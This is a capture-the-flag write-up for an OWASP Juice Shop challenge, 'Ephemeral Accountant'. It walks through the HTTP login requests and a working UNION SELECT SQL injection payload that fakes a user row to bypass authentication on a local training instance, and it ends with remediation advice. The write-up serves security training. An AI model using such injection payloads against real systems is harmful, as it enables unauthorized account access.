# Juice-Shop Write-up: Ephemeral Accountant

## Challenge Overview

**Title:** Ephemeral Accountant  
**Category:** Injection  
**Difficulty:** ⭐⭐⭐⭐ (4/6)

This challenge involves using SQL injection to simulate the login of a non-existent but temporarily created user "acc0unt4nt@juice-sh.op" without actually adding the account to the database permanently.

## Tools Used

- **Interception Proxy (e.g., Burp Suite):** To capture and modify the HTTP requests.

## Methodology and Solution

### Step 1: Analysis of Login Functionality

Initially, I captured the typical HTTP POST request used for logging in which looks something like this:

```http
POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{
  "email": "user@example.com",
  "password": "password123"
}
```

### Step 2: Crafting the SQL Injection Payload

Given the constraints of the challenge (no actual account creation and no persistent modification of the database), I opted for an SQL injection using the `UNION SELECT` strategy to mimic the existence of an account temporarily during the query execution time.

### Step 3: Injecting the Temporary User in the SQL Query

I modified the login request payload to include the SQL injection. The key here was to construct a subquery within the UNION SELECT that mimics a legitimate user record:

```http
POST /rest/user/login HTTP/1.1
Host: 127.0.0.1:3000
Content-Type: application/json

{
  "email": "' UNION SELECT * FROM (SELECT 20 AS `id`, 'acc0unt4nt@juice-sh.op' AS `username`, 'acc0unt4nt@juice-sh.op' AS `email`, 'test1234' AS `password`, 'accounting' AS `role`, '123' AS `deluxeToken`, '1.2.3.4' AS `lastLoginIp`, '/assets/public/images/uploads/default.svg' AS `profileImage`, '' AS `totpSecret`, 1 AS `isActive`, 12983283 AS `createdAt`, 133424 AS `updatedAt`, NULL AS `deletedAt`) AS tmp WHERE '1'='1';--",
  "password": "test1234"
}
```

We observe that the server responsde with a JWT token, meaning that he accepted our connection :

<img src="../assets/difficulty4/ephemeral_accountant_2.png" alt="decrypting coupons" width="500px">

### Solution Explanation

This SQL injection effectively creates a temporary row in the database for the duration of the query. The `UNION SELECT` clause constructs a complete user record, mirroring the structure expected by the application's login processing logic. By setting the `email` field in the injection to match the SQL query expected to retrieve a user, the application processes this "ephemeral" user as if it were legitimately present in the database.

The `WHERE '1'='1'` condition ensures that the injection always succeeds in matching the query context, bypassing the normal authentication process, and the comment `--` ensures any subsequent part of the real SQL query is ignored.

### Remediation

- **Use of Prepared Statements:** Always use parameterized queries or prepared statements to handle SQL queries. This approach ensures that the SQL execution engine treats the inputs as data rather than executable code.
- **Use SQL Server-side verification:** Ensure that the account where user will log really exist in database by double checking it server-side.
- **Input Validation:** Rigorous validation of all user inputs can reduce the risk of injection attacks. Inputs should be checked against expected patterns and sanitized.
